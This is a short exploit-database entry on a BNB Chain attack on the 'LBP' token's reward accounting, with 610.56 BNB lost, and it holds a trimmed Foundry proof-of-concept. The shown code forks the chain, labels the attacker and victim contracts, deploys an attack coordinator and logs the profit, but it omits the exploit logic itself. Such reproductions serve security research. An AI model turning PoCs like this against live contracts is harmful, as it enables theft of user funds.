# [?] LBP - LBP balanceOf reward accounting

## Summary
Severity: Unknown
Chain: BNB Chain
Component: LBP
Published: 2026-06-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/LBP_exp.sol
Type: defi-exploit-poc

## Details
Lost: 610.56 BNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 104_727_183;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = address(0);

        vm.label(TX_SENDER, "Transaction sender");
        vm.label(ATTACK_DEPLOYER, "Attack deployer");
        vm.label(ATTACK_COORDINATOR, "Attack coordinator");
        vm.label(PROFIT_RECEIVER, "Profit receiver");
        vm.label(BUILDER_PAYMENT_RECEIVER, "Builder payment receiver");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(LBP, "Little Boy Plus");
        vm.label(LBP_PAIR, "LBP/USDT pair");
        vm.label(USDT_WBNB_PAIR, "USDT/WBNB pair");
        vm.label(MOOLAH_PROXY, "Moolah proxy");
        vm.label(PANCAKE_VAULT, "Pancake Vault");
        vm.label(LBP_HASHRATE, "LBPHashrate");
        vm.label(POL_VAULT, "PolVault");
    }

    function testExploit() public balanceLog2(PROFIT_RECEIVER) {
        uint256 profitBefore = PROFIT_RECEIVER.balance;

        vm.startPrank(TX_SENDER);
        LBPAttackDeployer deployer = new LBPAttackDeployer();
        assertEq(address(deployer), ATTACK_DEPLOYER, "unexpected attack deployer address");
        address coordinator = deployer.run();
        assertEq(coordinator, ATTACK_COORDINATOR, "unexpected attack coordinator address");
        vm.stopPrank();

        uint256 bnbProfit = PROFIT_RECEIVER.balance - profitBefore;
        emit log_named_decimal_uint("Profit receiver BNB profit", bnbProfit, 18);

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/LBP_exp.sol_
